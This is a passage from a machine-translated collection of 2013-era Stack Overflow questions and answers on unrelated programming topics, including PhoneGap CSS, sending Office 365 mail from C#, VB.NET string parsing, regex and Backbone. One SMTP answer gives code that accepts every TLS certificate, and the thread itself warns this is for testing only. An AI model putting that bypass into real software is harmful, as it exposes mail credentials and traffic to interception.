当 Activity 退出时，您应该关闭您的 mediaPlayer。导航回活动后，在创建表面时重置表面。

# css - Phonegap + Galaxy s3 尺寸

> ID：15899211
> 
> 赞同：0
> 
> 时间：2013-04-09T10:13:22.730
> 
> 标签：css, cordova, height, galaxy, font-size

我将我的第一个应用程序发布到“play store”并使用 PhoneGap 制作。

该应用程序在所有设备上看起来都不错，但在 Galaxy S3 和 Note II 中字体大小和 div 高度太大。

我有：

```
if (window.devicePixelRatio == 1.5) {
          document.write('<link rel="stylesheet" type="text/css" href="css/hdpi.css">');
        } else if (window.devicePixelRatio == 1) {
          document.write('<link rel="stylesheet" type="text/css" href="css/mdpi.css">');
        } else if (window.devicePixelRatio == 2) {
          document.write('<link rel="stylesheet" type="text/css" href="css/xhdpi.css">');
        } else if (window.devicePixelRatio == 0.75) {
          document.write('<link rel="stylesheet" type="text/css" href="css/ldpi.css">');
        } 
```

加载正确的样式表。

银河 S3：

[http://img17.imageshack.us/img17/7998/16761073.png](http://img17.imageshack.us/img17/7998/16761073.png)

连结 4：

[http://img802.imageshack.us/img802/2327/88668575.png](http://img802.imageshack.us/img802/2327/88668575.png)

两个设备是 720x1280。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T10:49:18.430

Imo，最佳实践是在 css 中使用媒体查询来检测大屏幕。

使用媒体查询，您可以检测屏幕大小并对您的 CSS 进行适当的调整。

您可以通过执行 font-size 将字体大小重置为设备的默认字体大小：100%

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-10T07:31:59.857

问题是使用媒体查询，例如：

```
 @media only screen and (max-device-width: 720px) and (orientation:portrait) { 
.divbtn{ height:244px;} 
} 
```

我还针对不是 S3 的其他设备

# javascript - 如何在不同页面中维护选中的复选框

> ID：15899212
> 
> 赞同：0
> 
> 时间：2013-04-09T10:13:24.997
> 
> 标签：javascript, checkbox

如何在不同的页面中维护选中的复选框，我没有使用 gridview，我只是通过 JS 或 PHP 来执行此操作，我该怎么做？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T10:17:30.460

在 PHP 中使用会话和变量，您可以在页面上保存值。

# c# - 在 .net 中发送 SMTP 电子邮件测试 Microsoft Office 365

> ID：15899213
> 
> 赞同：17
> 
> 时间：2013-04-09T10:13:25.523
> 
> 标签：c#, exchange-server, office365, system.net.mail

我在 Exchange Online 服务上有一个邮件帐户。现在我正在尝试测试我是否能够通过 c# 应用程序向客户（在各种域和 Microsoft Office 365 上）发送邮件

我尝试实现以下代码，但出现错误

> *“根据验证程序，远程证书无效。”*

```
MailMessage mail = null;                
mail = new MailMessage();

string[] strToList = "abc@gmail.com"              
foreach (string strID in strToList)
{
    if (strID != null)
    {
        mail.To.Add(new MailAddress(strID));
    }
}

mail.From = "demo@onmicrosoft.com";
mail.Subject = "testing"
mail.IsBodyHtml = true;
mail.Body = "mail body";

SmtpClient client = new SmtpClient("smtp.outlook.office365.com");
client.Port = 587;
client.EnableSsl = true;
client.UseDefaultCredentials = false;
NetworkCredential cred = new System.Net.NetworkCredential("demo@onmicrosoft.com", "mypassword");
client.Credentials = cred;
client.Send(mail); 
```

如果我做错了什么，请指教。提前非常感谢。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2013-12-23T11:46:51.780

这对我有用（从[源代码](https://stackoverflow.com/questions/3408397/asynchronously-sending-emails-in-c)编辑）

```
 ThreadPool.QueueUserWorkItem(t =>
            {
                SmtpClient client = new SmtpClient("smtp.office365.com",587);
                client.EnableSsl = true;
                client.Credentials = new System.Net.NetworkCredential("xxx@yyy.com", "password");
                MailAddress from = new MailAddress("xxx@yyy.com", String.Empty, System.Text.Encoding.UTF8);
                MailAddress to = new MailAddress("xxx@yyy.com");
                MailMessage message = new MailMessage(from, to);
                message.Body = "The message I want to send.";
                message.BodyEncoding = System.Text.Encoding.UTF8;
                message.Subject = "The subject of the email";
                message.SubjectEncoding = System.Text.Encoding.UTF8;
                // Set the method that is called back when the send operation ends.
                client.SendCompleted += new SendCompletedEventHandler(SendCompletedCallback);
                // The userState can be any object that allows your callback 
                // method to identify this send operation.
                // For this example, I am passing the message itself
                client.SendAsync(message, message);
            });

        private static void SendCompletedCallback(object sender, AsyncCompletedEventArgs e)
        {
            // Get the message we sent
            MailMessage msg = (MailMessage)e.UserState;

            if (e.Cancelled)
            {
                // prompt user with "send cancelled" message 
            }
            if (e.Error != null)
            {
                // prompt user with error message 
            }
            else
            {
                // prompt user with message sent!
                // as we have the message object we can also display who the message
                // was sent to etc 
            }

            // finally dispose of the message
            if (msg != null)
                msg.Dispose();
        } 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2014-06-12T05:16:03.970

在某些情况下，TLS 身份验证可能会导致在使用 smtp.office365.com 作为 c# 中的 SMTP 时出现问题。在 Send(msg) 语句之前尝试以下行（覆盖 .TargetName）：

```
client.TargetName = "STARTTLS/smtp.office365.com"; 
```

这个对我有用

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2017-05-10T08:59:13.200

这也是发送邮件的最佳方式。我已经在我的项目中尝试过它并且工作正常。

```
 SmtpClient client = new SmtpClient("smtp.office365.com", 587);
        client.EnableSsl = true;
        client.Credentials = new System.Net.NetworkCredential("From@mail.com", "sdsd@12345");
        MailAddress from = new MailAddress("From Address Ex From@mail.com", String.Empty, System.Text.Encoding.UTF8);
        MailAddress to = new MailAddress("From Address Ex To@mail.com");
        MailMessage message = new MailMessage(from, to);
        message.Body = "This is your body message";
        message.BodyEncoding = System.Text.Encoding.UTF8;
        message.Subject = "Subject";
        message.SubjectEncoding = System.Text.Encoding.UTF8;

        client.Send(message); 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2014-03-02T22:06:16.677

尝试 smtp.office365.com 而不是 smtp.outlook.office365.com

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2013-04-09T10:16:01.103

尝试使用：

```
ServicePointManager.ServerCertificateValidationCallback = 
    (sender, certificate, chain, sslPolicyErrors) => true; 
```

此代码将允许您接受无效证书。

正如 Ori Nachum 在评论中提到的那样：这是一种非常糟糕的做法，只能用于测试目的。这是一个安全风险！

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2013-07-08T05:50:03.913

错误

> SMTP 服务器需要安全连接或客户端未通过身份验证。服务器响应为：5.7.1 客户端未通过身份验证

当关联的用户帐户密码过期或帐户被锁定时，通常会发生这种情况。尝试在 Active Directory 中设置“用户密码永不过期”，如果它不违反您的公司密码策略 :) 这发生在我使用 o365 Exchange Online A/c 进行测试时。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2020-06-26T13:55:27.463

```
var Client = new SmtpClient("smtp.office365.com", 587);
Client.EnableSsl = true;
Client.Credentials = new System.Net.NetworkCredential("mail", "pass");
ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls; 
```

我成功发送带有代码的邮件

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2018-08-14T08:10:45.893

尝试设置：

```
ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls; 
```

它将确保服务的 SecurityPoint 是 TLS。
请注意此处提供的设置的答案

```
ServicePointManager.ServerCertificateValidationCallback = 
    (sender, certificate, chain, sslPolicyErrors) => true; 
```

可能有利于测试目的 - 但这是一个**重大的安全风险**！
不要在 prod 帐户或 prod 环境中使用。

# facebook - 导出 android 项目添加 facebook sdk 获取错误转换为 dalvik 格式失败，错误 1

> ID：15899215
> 
> 赞同：0
> 
> 时间：2013-04-09T10:13:33.777
> 
> 标签：facebook, sdk, export

我在 android 上做一个小项目，它使用 facebook sdk 3.0。一切都很好，直到我导出到上传 android 市场，我收到错误“错误转换为 dalvik 格式失败，错误 1”，我尝试在 sdk 中导出 2 个示例项目，我得到了同样的错误。我在 google 上进行研究，原因是项目和 facebook sdk 在 com.facebook.android 中具有相同的名称文件 R.java。但是因为它文件 R.java 所以我不能重命名它。我尝试其他方式，我关闭“自动构建”并删除 facebook sdk 中的 R.java 文件，它可以导出密钥库和 apk 文件，但 apk 文件不起作用。那么我能做些什么来解决它呢？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-10-10T15:32:10.333

使用 Facebook SDK 的应用程序也遇到了这个问题。我正在尝试各种各样的东西，所以我不确定到底修复了什么，但这里的设置对我有用：

FacebookSDK > 属性 > Java 构建路径 > 排序和导出

Android 2.2 - 未选中

Android 私有库 - 已选中

Android 依赖项 - 已检查

MyApp > 属性 > Java 构建路径 > 排序和导出

Android 4.2.2 - 选中

Android 私有库 - 已选中

Android 依赖项 - 已检查

另外，我以前做过，不确定是否重要。从 3.5.2 恢复到 Facebook SDK 版本 3.5。更新到最新的 ADT 22.2.1。将 Facebook SDK 从 4.2.2 更改为使用 Android 2.2。

# vb.net - 如何从动态字符串内容中获取修复子字符串？

> ID：15899217
> 
> 赞同：1
> 
> 时间：2013-04-09T10:13:53.390
> 
> 标签：vb.net, vb.net-2010

我正在开发 VB.NET Windows 应用程序。在 VS 2010 中。

我想得到子字符串

> $CostCenterId|4^10

从下面的字符串。

> PaymentMode|NEFT^$IsPaid|False^$Currency|INR-印度卢比^$CostCenterId|4^10$LedgerId|2^3$

当前字符串（$CostCenterId|4^10）在序列中的位置可能会改变。但它总是在两个 $ 符号之间。我已经写了下面的代码，但是对接下来要写什么感到困惑？

```
Public Sub GetSubstringData()

   dim sfullString = "PaymentMode|NEFT^$IsPaid|False^$Currency|INR-Indian  
    Rupee^$CostCenterId|4^10$LedgerId|2^3$"

     Dim CostIndex As Integer
     CostIndex = sDiscription.IndexOf("CostCenterId")
     sDiscription.Substring(CostIndex,

    End Sub 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-09T10:22:07.617

查看字符串的[拆分函数](http://msdn.microsoft.com/en-gb/library/6x627e5f%28v=vs.80%29.aspx)。这允许您根据指定的分隔字符将字符串拆分为子字符串。

然后你可以这样做：

```
Dim sfullString = "PaymentMode|NEFT^$IsPaid|False^$Currency|INR-Indian Rupee^$CostCenterId|4^10$LedgerId|2^3$"
Debug.WriteLine("$" + sfullString.Split("$"c)(3)) 
```

结果：`$CostCenterId|4^10`

您可能需要进行一些错误检查以确保字符串实际上包含您期望的数据。

但是查看数据，您拥有的是一个包含键值对的字符串，因此您最好有一个属性来保存`CostCenterId`并提取数据，如下所示：

```
Public Property CostCenterId As String

Public Sub Decode(ByVal code As String)
    For Each pair As String In code.Split("$"c)
        If pair.Length > 0 AndAlso pair.Contains("|") Then
            Dim key As String = pair.Split("|"c)(0)
            Dim value As String = pair.Split("|"c)(1)
            Select Case key
                Case "CostCenterId"
                    Me.CostCenterId = value
            End Select
        End If
    Next
End Sub 
```

然后像这样调用它：

```
Decode("PaymentMode|NEFT^$IsPaid|False^$Currency|INR-Indian Rupee^$CostCenterId|4^10$LedgerId|2^3$") 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T10:24:44.317

这应该有效：

```
Dim token = "$CostCenterId"
Dim costIndexStart As Integer = sfullString.IndexOf(token)
Dim costIndexEnd As Integer = sfullString.IndexOf("$", costIndexStart + token.Length)
Dim cost As String = sfullString.Substring(costIndexStart, costIndexEnd - costIndexStart + 1) 
```

结果：`"$CostCenterId|4^10$"`

如果你想省略美元符号：

```
Substring(costIndexStart + 1, costIndexEnd - costIndexStart - 1) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-09T10:35:54.780

你的弦，

```
Dim xString = "PaymentMode|NEFT^$IsPaid|False^$Currency|INR-Indian Rupee^$CostCenterId|4^10$LedgerId|2^3$" 
```

子串过程，

```
 xString = xString.Substring(xString.IndexOf("$CostCenter"), xString.IndexOf("$", xString.IndexOf("$CostCenter") + 1) - xString.IndexOf("$CostCenter")) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-09T10:19:39.293

为什么不通过 $ 将字符串 split() 成一个数组，然后查找包含 CostCenterId 的元素

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-04-09T10:19:51.453

尝试这样的事情：

```
Dim CostIndex As Integer
CostIndex = sDiscription.IndexOf("CostCenterId")

auxNum = sDiscription.IndexOf("$"c, CostIndex) - CostIndex
sResult = sDiscription.SubString(CostIndex, auxNum) 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-04-09T12:00:22.073

试试这个代码：

```
 Dim sfullString = "PaymentMode|NEFT^$IsPaid|False^$Currency|INR-Indian" _
    & "Rupee^$CostCenterId|4^10$LedgerId|2^3$"

        Dim sp() As String = {"$"}
        Dim ar() As String = sfullString.Split(sp, StringSplitOptions.RemoveEmptyEntries)
        Array.Sort(ar)
        MsgBox("$" & ar(0)) 
```

# objective-c - NSString 类型的 EXC_BAD_ACCESS 错误

> ID：15899220
> 
> 赞同：0
> 
> 时间：2013-04-09T10:14:00.957
> 
> 标签：objective-c, nsstring, nsobject

我是这个 mac 应用程序开发的新手。

该应用程序对某些数据运行良好，并且应用程序因少数条目而崩溃。

```
-(void)presentClientsss
{
    [productVendorTextField setStringValue:[NSString stringWithFormat:@"%@", [[popUpVendor selectedItem] title]]];

    NSMenuItem *tempMenuItem = [popUpVendor selectedItem];
    NSString *selectedItemTitle = [tempMenuItem title];

    for (int k = 0; k < [appDelegate.vendorInfoArr count]; k++)
    {
        VendorInfo *tempCustomerInfoModel = [appDelegate.vendorInfoArr objectAtIndex:k];

        if ([tempCustomerInfoModel.vendorName isEqualToString:selectedItemTitle])
        {
            oldVendorIde = [NSString stringWithFormat:@"%ld", tempCustomerInfoModel.rowId];

            NSLog(@"Selected RowID = %@",oldVendorIde);

            break;
        }
    }
} 
```

我将`oldVendorIde`字符串发送到下一个方法。

```
- (ItemModel *)itemNodelWithAttributes {
    isProductIdExist = NO;

    if ([senderInfo isEqualToString:@"nP"]) {
        for (int i = 0; i < [appDelegate.itemsArr count]; i++) {
            ItemModel *tempIM = [appDelegate.itemsArr objectAtIndex:i];
            if ([tempIM.productId isEqualToString:[[productIdTextField stringValue] uppercaseString]]) {
                isProductIdExist = YES;
                break;
            }
        }
    }

    if ([senderInfo isEqualToString:@"eP"])  {
        for (int i = 0; i < [appDelegate.itemsArr count]; i++) {
            ItemModel *tempIM = [appDelegate.itemsArr objectAtIndex:i];
            if (tempIM.itemId == itemIdentity) {
                if ([tempIM.productId isEqualToString:[[productIdTextField stringValue] uppercaseString]]) {
                    isProductIdExist = NO;
                }
            }
            else if ([tempIM.productId isEqualToString:[[productIdTextField stringValue] uppercaseString]]) {
                isProductIdExist = YES;
            }
        }
    }
    int tempItemExists = [self saveProductImage:[[productIdTextField stringValue] uppercaseString]];

    NSLog(@"oldVendorIde =%@",oldVendorIde);
    ItemModel *iM = [[ItemModel alloc] initWithItemId:itemIdentity defaultItemMinimumValue:[productMinValueTextField floatValue] staticItemPrice:[productPriceTextField doubleValue] dynamicItemQuantity:[productCurrentStockTextField doubleValue] staticItemDescription:[productDescriptionTextField stringValue] prodId:[[productIdTextField stringValue] uppercaseString] itemVendor:oldVendorIde itemImgExists:tempItemExists stockAvailable:0 itemNotes:[notesTextField string] BarcodeDesc:[BarcodeDescTextView stringValue]];

    return iM;
} 
```

在这种方法中`oldVendorIde`，某些数据同样可以正常工作，有时它会在此时崩溃。

`oldVendorIde`sometime 在方法中没有任何价值，应用`itemNodelWithAttributes`程序在那时崩溃。

Sone可以帮我解决这个问题..提前谢谢..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T10:32:59.747

来自 a 的文本`UITextField`是通过`text`属性 ( `[productIdTextField text]`) 访问的，而不是通过`stringValue`。

# c# - 生成excel工作表时不想要网格视图模板字段

> ID：15899226
> 
> 赞同：0
> 
> 时间：2013-04-09T10:14:21.293
> 
> 标签：c#, asp.net

我有 GridView，我想生成网格列的 excel 表，有生成 excel 的代码和单击按钮。我的问题是我不希望 Excel 表中网格视图列中的模板字段。我只想要 BoundField DataField

```
<asp:ImageButton ID="btnExcel" runat="server" Text="Excel" ToolTip="Excel"  ImageUrl="~/Images/Resources/thumb/excel.png" OnClick="btnExcel_Click" />
protected void btnExcel_Click(object sender, ImageClickEventArgs e)
{
    ExportToExcel("Repoet.xls", grdReq);
}

public void ExportToExcel(string strFileName, GridView gv)
{
        HtmlForm form = new HtmlForm();
        Response.ClearContent();
        Response.Buffer = true;
        Response.AddHeader("content-disposition", "attachment; filename=" +      strFileName);
        Response.ContentType = "application/excel";
        System.IO.StringWriter sw = new System.IO.StringWriter();
        HtmlTextWriter htw = new HtmlTextWriter(sw);
        form.Controls.Add(gv);
        this.Controls.Add(form);
        form.RenderControl(htw);
        Response.Write(sw.ToString());
        Response.End();
    }
}

<asp:GridView ID="grdReq" runat="server" AutoGenerateColumns="false" CssClass="SimpleGrid"
                OnRowDataBound="grdReq_RowDataBound">
<Columns>
 <asp:BoundField DataField="CandidateID" HeaderText="Candidate Id" />
 <asp:TemplateField>
 <ItemTemplate>
   <asp:HyperLink ID="hlnkEvalSheet" runat="server" Text='<%#Eval("Candidate Name") %>'
    CssClass="logo" NavigateUrl='<%# "~/Recruiter/EvalSheets.aspx?ClientId=" +      hdnClientId.Value  + "&ReqId=" + hdnReqId.Value  %>'
    ImageUrl="~/Images/Resources/search.png" >
    </asp:HyperLink>
 </ItemTemplate>
 </asp:TemplateField>

<asp:BoundField DataField="Candidate Name" HeaderText="Candidate Name" />
<asp:BoundField DataField="Organization" HeaderText="Organization" />                     <asp:BoundField DataField="Desig" HeaderText="Design" /> 
<asp:BoundField DataField="Overall" HeaderText="Overall" />
<asp:BoundField DataField="Qualification" HeaderText="Qualification" /> 
<asp:BoundField DataField="Location" HeaderText="Location" />
<asp:BoundField DataField="Current CTC (LPA)" HeaderText="Current CTC (LPA)" />
</Columns>
</asp:GridView> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T11:56:44.177

导出gridview时做一件事，从gridview（[单击此处](https://stackoverflow.com/questions/785799/how-can-i-export-a-gridview-datasource-to-a-datatable-or-dataset)）或主要来源检索数据表上的数据，然后

创建新的gridview对象，如

```
 Gridview gvexport=new Gridview();
  gvexport.Datasource=dt //retrived data
  gvexport.databind(); 
```

使用此 gridview 生成 excel 表

# c++ - 将值从一个数组插入到另一个直接排序的数组

> ID：15899228
> 
> 赞同：1
> 
> 时间：2013-04-09T10:14:25.793
> 
> 标签：c++, sorting, vector

所以我要做的就是将某些值从一个数组插入到另一个直接排序的数组中，而无需稍后使用 BubbleSort 或 QuickSort 或任何其他方法对它们进行排序。我想不出一种方法来做到这一点......我必须将它们从最大值插入到最小值。这是我到目前为止所拥有的：

```
void palindroame (int x[100], int y[100]) {
    int i=0, j, k=0, aux;
    while (x[i]!=0) { 
        k++; i++; 
    }
    i=0;
    for (i=0; i<=k-1; i++) y[i]=0;
    for (i=0; i<=k-1; i++) { 
        if (palindrom(x[i])!=0 && palindrom(x[i+1])!=0) 
            if (x[i]<x[i+1]) { 
                aux=x[i+1]; x[i+1]=x[i]; x[i]=aux; 
            } 
    } //wrong
    for (i=0; i<=k-1; i++) { 
        if (palindrom(x[i])) y[i]=x[i]; 
    } //wrong
} 
```

提前致谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T10:40:31.233

您需要的算法是[选择排序](http://en.wikipedia.org/wiki/Selection_sort)，您可以使用它同时进行排序和复制。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-09T10:34:44.897

您可以查看优先级队列：

[http://www.cplusplus.com/reference/queue/priority_queue/](http://www.cplusplus.com/reference/queue/priority_queue/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-09T12:03:33.837

这是我最近做的一个选择排序的例子（其中 a 是一个向量）

应该给你足够的继续希望它有帮助，如果你喜欢问问题

```
for (unsigned int i = 0; i < a.size()-1; i++)
{
    int min = i;

    for(unsigned int j = i +1; j < a.size(); j++)
    {
        // If new minimum is found then stores this as the new minimum
        if(a[j] < a[min])
        {
            min = j;
        }
    }
    // Stores the values in the array in ascending order
    if (min != i)
    {
        int temp = a[i];
        a[i] = a[min];
        a[min] = temp;
    }
}
// Returns the array in ascending order
return a; 
```

编辑：只是为了澄清这是在一个已经有值的向量上工作，以防不清楚，但我认为带有代码注释的示例足以帮助你 IMO

# regex - 正则表达式查找在 href 属性中没有 http 或 https 的锚标记

> ID：15899229
> 
> 赞同：0
> 
> 时间：2013-04-09T10:14:28.733
> 
> 标签：regex, regex-negation, regex-lookarounds

我有这个示例文本，我想在其上运行正则表达式来拉取地址部分中 href 不包含 http|https 的锚标记。

我正在尝试使用这个正则表达式，但它还没有完成。当锚不是以 http 或 https 开头时，我无法拔出锚。

链接到 gskinner 网站 - [http://regexr.com?34ev0](http://regexr.com?34ev0)

```
<a.*?href=[""|'](http|https:\/\/)(?<link>[^""|']*)[""|'].*?> 
```

这是示例字符串：-

```
<br /><span style="font-size: 16px;"><strong><a target="_blank" href="http://www.yahoo.com">Good Link (Yahoo)</a><br /><br /><a target="_blank" href="www.bbc.com">Bad Link (BBC)</a><br /><br /><a href="" id="anchorSocialMedia" onclick="ShowModalPopup('anchorSocialMedia','/Events/Popup/SocialMediaShareModal.aspx','650px','500px');">Share This Event</a><br />Badge Perf Testing<br /><br /></strong></span> 
```

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-09T10:57:47.307

使用 JavaScript 正则表达式方法（几乎所有语言都有等价物）：

```
<your string>.match(/<a\s[^>]*href\s*=\s*"[^"]*"[^>]*>/g)
.join('')
.match(/href\s*=\s*"(?!https?:\/\/)[^"]*"/g); 
```

或者

```
<your string>.match(/<a\s[^>]*href\s*=\s*"(?!https?:\/\/)[^"]*"[^>]*>/g)
.map(function(x){return x.replace(/.*(href\s*=\s*"[^"]*").*/,'$1');}) 
```

你选！

# c - c中的参数类型和编号检查

> ID：15899233
> 
> 赞同：1
> 
> 时间：2013-04-09T10:14:39.697
> 
> 标签：c, function, parameters

我希望添加检查以确保始终使用正确数量的参数调用以下函数并且它们的类型正确。解决这个问题的最佳方法是什么？

例如

```
int differance(int *a, int *b)
{
 //Work out difference
} 
```

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-09T10:19:56.683

编译器会为你做这件事。

如果你声明一个函数有两个参数，你不能用更少或更多的参数调用它，否则你会得到一个错误。

如果您尝试将指针传递给 an 以外的其他内容，`int`那么编译器至少会警告您，甚至可能给您一个错误。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-09T11:14:04.610

为确保您的函数调用与您的函数定义匹配：

*   对于在单个源文件中定义和使用的函数，请在使用之前声明或定义该函数。
*   对于跨多个源文件定义和使用的函数，在头文件（名称以 .h 结尾）中声明函数，并使用 #include 将该头文件包含在定义或使用该函数的每个源文件中。#include 应该在函数的任何定义或使用之前。
*   检查您的编译器设置并确保为缺少函数原型和不匹配的函数原型打开警告。
*   如果您的编译器有此类警告，请打开危险隐式转换的警告。
*   如果可以避免，请不要将参数声明为“void *”。通常，您希望保留类型信息，以便编译器可以检查它。

# webmatrix - Row_Number 在 webmatrix 中不起作用

> ID：15899235
> 
> 赞同：0
> 
> 时间：2013-04-09T10:14:41.787
> 
> 标签：webmatrix, row-number

我正在使用 webmatrix 在页面中显示一些数据。此查询在 sql server 2008 中运行良好，但在 WebMatrix 中运行良好。

```
select row_number() over (order by title) as SNO, title from movies 
```

错误：“解析查询时出错。[令牌行号= 1，令牌行偏移量= 21，错误中的令牌= over]”

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T10:32:32.257

如果您在 WebMatrix 中使用 SQL CE 作为数据库，就会发生这种情况。SQL CE 不支持 OVER 关键字。通过单击“迁移”按钮将您在 WebMatrix 中使用的 SQL CE 数据库迁移到 SQL Server。然后它将开始工作。

# css - CSS3 动画关键帧

> ID：15899237
> 
> 赞同：0
> 
> 时间：2013-04-09T10:14:57.333
> 
> 标签：css, keyframe

我想知道是否可以倒带我的动画，情况如下：

我正在使用 css3 关键帧为我的导航设置动画：

```
 @-webkit-keyframes nav /* Safari and Chrome */
        {
            0% {width: 0%; opacity:0.0;}
        100% {width: 22%; opacity:0.5;}
        }

        nav:hover
        {
            animation: nav 3s;
            -moz-animation: nav 3s; /* Firefox */
            -webkit-animation: nav 3s; /* Safari and Chrome */
            -o-animation: nav 3s; /* Opera */
        } 
```

现在，当我将其悬停时，他会扩展动画，不，我想知道如何在我释放悬停时将动画倒回甚至平滑。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T13:03:30.837

您可以使用 CSS 过渡来执行此操作。

**示例 CSS**

```
nav
{
    width: 0%;
    opacity: 0;
    transition:all 3s ease-in-out;    
}

nav:hover
{
    width: 22%; 
    opacity:0.5;     
} 
```

# c - getch() 在没有 conio.h 的情况下工作 - 这怎么可能？

> ID：15899239
> 
> 赞同：2
> 
> 时间：2013-04-09T10:15:03.013
> 
> 标签：c, visual-studio-2010

我开始使用 Visual Studio 2010 (c++) 编写 C 代码。

```
#include <stdio.h>
#include <stdlib.h>

int main(){
    printf("test");
    getch();
    return 0;
} 
```

这段代码可以工作，即使没有添加`conio.h`库，程序也会在那里暂停`getch()`；带有下划线，它表示**错误标识符 getch(); 是未定义的**。

这怎么可能？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-04-09T10:29:51.653

C 语言对函数有“隐式声明”的概念。如果您不提供原型，编译器将假定函数声明如下：

```
int getch(); 
```

这意味着它是一个返回 int 的函数，它没有指定有关其参数的信息。严格来说这不是错误，但是如果您的警告级别设置得足够高，许多编译器会发出警告。从 C99 开始，此行为已被删除，您通常应避免依赖它。

由于该库仍提供该`getch()`功能，因此在链接时解析其符号没有问题。结果，由于`getch()`实际上确实返回了 a `int`，所以一切正常。

# javascript - 骨干集合提取不更新@collection.length

> ID：15899244
> 
> 赞同：0
> 
> 时间：2013-04-09T10:15:10.880
> 
> 标签：javascript, backbone.js, coffeescript

我获取集合的前 15 条记录，然后单击按钮后，我获取同一集合的另外 15 条记录。在第二次之后，集合的长度是 15 而不是 30。即使正在加载 15 条新记录并且“添加”事件也能正常工作。

第一次代码：

```
@collection.fetch
  data: @filter
  update: true
  success: =>
    @onSuccessCollection() 
```

第二次代码：

```
loadMore: ->
  @filter.skip = @collection.length
  @collection.fetch
    update: true
    data: @filter,
    success: =>
      @onSuccessCollection() 
```

成功回调（第一次返回 15，第二次返回 15，而预期为 30）：

```
onSuccessCollection: ->
  console.log 'onCollectionReset: collection.length: ', @collection.length 
```

我使用 Backbone 0.9.10

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T12:13:19.547

您必须将标志设置`remove`为 false。“智能更新”的删除标志默认为 true，因此当您只获取 15 个模型时，首先删除 15 个（因此长度等于 15）：

```
// Smartly update a collection with a change set of models, adding,
// removing, and merging as necessary.
update: function(models, options) {
  options = _.extend({add: true, merge: true, remove: true}, options); 
```

[来源](https://github.com/documentcloud/backbone/blob/0.9.10/backbone.js)

# visual-studio-2012 - VS 2012 更新 2 后的 Intellisense 异常缓慢

> ID：15899247
> 
> 赞同：1
> 
> 时间：2013-04-09T10:15:13.263
> 
> 标签：visual-studio-2012, intellisense, updates

将我的 VS 2012 更新到**更新 2 后，**在 XAML 编辑器中工作时，我必须为每个键等待大约**2 秒。**不同之处仅在于当我按下 CTRL + SPACE 时，出现 Intellisense 窗口时，我可以正常书写。在实践中，看起来我必须在每个属性/控件之前按 CTRL + SPACE。简直无处不在。它从未在更新 1 中发生过

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T08:27:06.530

你知道吗，在与它打架并怀疑属性窗口负责反应速度之后，我最终决定**卸载更新 2**，一切都像魅力一样。

# objective-c - UINavigationController 与 AppDelegate 中的 UISegmentedControl 切换 UINavigationController 的 rootviewcontroller

> ID：15899253
> 
> 赞同：1
> 
> 时间：2013-04-09T10:15:39.867
> 
> 标签：objective-c, uinavigationcontroller, uisegmentedcontrol

我想创建一个应用程序，其中导航控制器作为窗口根视图控制器和导航控制器标题视图中的分段控件以切换其根视图控制器

问题：将分段控制添加到 nag 控制器后不存在

代码：

```
(BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{  
    self.window = [[[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]] autorelease];

    FirstViewController * fc = [[FirstViewController alloc] initWithNibName:@"FirstView" bundle:nil];

    UINavigationController * nc = [[UINavigationController alloc] initWithRootViewController:fc];
    [fc release];

    self.window.rootViewController = nc;

    NSArray * array = [NSArray arrayWithObjects:@"GPS",@"List",@"Map", nil];

    UISegmentedControl * sc = [[UISegmentedControl alloc] initWithItems:array];

    sc.frame = CGRectMake(0, 0, 250, 50);
    sc.segmentedControlStyle = UISegmentedControlStylePlain;

    [nc.navigationItem setTitleView:sc];

    [sc release];
    [nc release];

    [self.window makeKeyAndVisible];

    return YES;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T11:00:26.033

您正在为 NavigationItem 设置 titleView 而不是为它设置 Item 。

```
NSArray * array = [NSArray arrayWithObjects:@"GPS",@"List",@"Map", nil];

UISegmentedControl * sc = [[UISegmentedControl alloc] initWithItems:array];
sc.frame = CGRectMake(0, 0, 250, 50);
sc.segmentedControlStyle = UISegmentedControlStylePlain; 
```

要在标题视图中设置，请使用此行

```
[ViewController.navigationItem setTitleView:sc]; 
```

设置左或右您不能直接将项目添加到导航栏，因此使用您的段控件创建 BarButtonItem

```
UIBarButtonItem *segmentItem = [[UIBarButtonItem alloc] initWithCustomView:sc]; 
```

将其添加到 ViewController 而不是 NavigationController

```
[ViewController.navigationItem setRightBarButtonItem:segmentItem]; 
```

# css - 960 网格系统中的自定义居中内容

> ID：15899260
> 
> 赞同：0
> 
> 时间：2013-04-09T10:16:03.220
> 
